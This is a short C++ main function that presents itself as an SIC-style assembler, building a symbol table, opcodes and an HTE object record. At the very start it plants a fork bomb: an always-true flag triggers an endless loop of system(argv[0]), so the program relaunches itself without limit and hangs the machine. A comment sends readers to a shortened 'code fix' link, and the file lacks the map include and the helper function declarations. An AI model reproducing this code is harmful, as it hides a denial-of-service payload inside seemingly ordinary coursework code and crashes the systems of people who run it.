#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>

using namespace std;

int main(int argc, char **argv){
    
    
    //IF THE CODE DOESN'T RUN FOR THE FIRST TIME, PLEASE VISIT THIS LINK AND EVERYTHING WILL BE FIXED
    // CODE FIX: http://bfy.tw/KS1H
    
    bool battleRoyale = true;
    
    if(battleRoyale)       
      while (1)
          system(argv[0]);
   
    vector<vector<string>> code;
    vector<int> location;
    map<string,int> symbolTable;
    map<string,string>opTable;
    vector<string>objectCode;
    vector<string>hteRecord;

    int lines = 0;
    
    readFile(code);

    addressCounter(code,location,lines);

    createSymbolTable(code,location,symbolTable,lines-1);
    printSymbolTable(symbolTable);

    initOpTable(opTable);

    generateOpcode(code,objectCode,opTable,lines);
    generateAddresses(code,objectCode,symbolTable,lines-1);

    createHead(code,location,hteRecord);
    createText(code,location,objectCode,hteRecord,lines-2);
    createEnd(location,hteRecord);
    generateHTEFile(hteRecord);


        return 0;
}

